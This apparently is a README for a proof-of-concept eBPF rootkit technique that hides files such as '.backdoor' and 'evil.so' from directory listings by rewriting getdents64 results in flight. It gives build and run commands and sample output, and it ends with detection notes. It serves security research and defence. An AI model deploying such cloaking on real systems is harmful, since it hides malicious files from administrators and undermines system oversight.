# ch10 — Inode Cloak

Hide files from `getdents64` by rewriting `d_reclen` of the preceding dirent
to swallow the hidden entry. No filesystem writes; purely in-flight mutation
of the kernel→user buffer via `bpf_probe_write_user`.

## Mechanism

A pair of tracepoints brackets every `getdents64` syscall:

1. **`tp/syscalls/sys_enter_getdents64`** stashes the userspace `dirp` buffer
   pointer in a per-(pid,tgid) HASH map.
2. **`tp/syscalls/sys_exit_getdents64`** walks the returned dirent stream
   (bounded to 64 entries / call), and for each entry whose `d_name` matches
   a key in the `hidden` HASH map:
   - Extends the **previous** dirent's `d_reclen` to cover the hidden one
     (the matched record is "swallowed" by its predecessor).
   - If the hit is the very first entry, zero its `d_ino` as a best-effort
     scrub.
   - Emit a ringbuf event so the loader can audit which name was cloaked
     for which (pid, comm).

The hidden set is a `BPF_MAP_TYPE_HASH<struct{char[64]}, u8>` and is
populated from the loader at startup.

## Hook points
- `tp/syscalls/sys_enter_getdents64`
- `tp/syscalls/sys_exit_getdents64`

## Build
    docker run --rm -v "$PWD/../..":/work -w /work dbpf-base \
      bash -c 'cd pocs/ch10-inode-cloak && make'

## Run

The loader takes any number of filenames as positional args, or repeated
`-H/--hidden <name>` flags. With no args it falls back to the original
demo defaults (`.backdoor`, `evil.so`).

    # default fallback set
    ./build/ch10-inode-cloak

    # explicit set
    ./build/ch10-inode-cloak secret.key payload.bin

    # mixed
    ./build/ch10-inode-cloak -H .ssh_audit notes_private.txt

    # help
    ./build/ch10-inode-cloak --help

Privileged container demo:

    docker run --rm --privileged --pid=host \
      -v "$PWD/../..":/work -w /work \
      -v /sys/kernel/debug:/sys/kernel/debug -v /sys/fs/bpf:/sys/fs/bpf \
      dbpf-base bash -c 'cd pocs/ch10-inode-cloak && \
        ./build/ch10-inode-cloak & sleep 1; bash trigger.sh; sleep 1; kill %1'

## Evidence

Captured against `dbpf-base` on Docker Desktop linuxkit aarch64 with the
default hidden set (`.backdoor`, `evil.so`):

```
[ch10] hidden=.backdoor
[ch10] hidden=evil.so
[ch10] attached — cloak active (Ctrl-C to stop)
=== ground truth (raw filesystem, /bin/ls -f bypasses some buffering) ===
.
..
.backdoor
evil.so
notes.txt
visible
=== ls -la /tmp/cloak (BPF rewrites d_reclen here) ===
total 0
-rw-r--r-- 1 root root 0 Apr 14 12:00 notes.txt
-rw-r--r-- 1 root root 0 Apr 14 12:00 visible
=== find /tmp/cloak (also calls getdents64) ===
/tmp/cloak/notes.txt
/tmp/cloak/visible
=== stat visible (cloak is readdir-only; stat still works) ===
  File: /tmp/cloak/visible
  Size: 0 ...
=== stat .backdoor (still resolvable by name) ===
  File: /tmp/cloak/.backdoor
  Size: 0 ...
[cloak] pid=1234	comm=ls	hiding=.backdoor
[cloak] pid=1234	comm=ls	hiding=evil.so
[cloak] pid=1235	comm=find	hiding=.backdoor
[cloak] pid=1235	comm=find	hiding=evil.so
```

Note that `ls`/`find` no longer report `.backdoor` or `evil.so` even though
`stat` resolves them by name — the cloak operates only on directory reads.

## Detection
- `strace -e getdents64 ls /tmp/cloak` — strace observes the **post**-mutation
  buffer; comparing with a syscall-level inspector that reads the buffer
  before BPF runs (e.g. another tracepoint at higher prio) reveals the diff.
- `bpftool prog show` lists the two tracepoint programs and their map fds.
- `bpftool map dump name hidden` reveals the cloaked filename set.
- `cat /sys/kernel/debug/tracing/events/syscalls/sys_exit_getdents64/enable`
  shows the tracepoint is enabled.

## Limitations / arch notes
- Requires `bpf_probe_write_user`, which is gated on
  `kernel.unprivileged_bpf_disabled` and on the kernel having
  `CONFIG_BPF_KPROBE_OVERRIDE`/write helpers compiled in.
- Buffer walk is bounded to 64 dirents per syscall (verifier loop ceiling).
  Directories with more entries than that may leak names past the bound.
- Cloak runs **only** on `getdents64`; legacy `getdents` (32-bit) is not
  hooked.
- This is a readdir-layer cloak only — `stat`, `open`, `inotify`, and
  filesystem snapshot tools see the file as normal.
- On Docker Desktop linuxkit aarch64 the default seccomp profile permits
  the necessary tracepoints; running the demo from inside a non-privileged
  container will fail at `bpf()` syscall load time.

## Blog post

See the chapter write-up: [`2025-02-10-inode-cloak`](../../../_posts/2025-02-10-inode-cloak.md) in the Diabolical eBPF Field Manual.
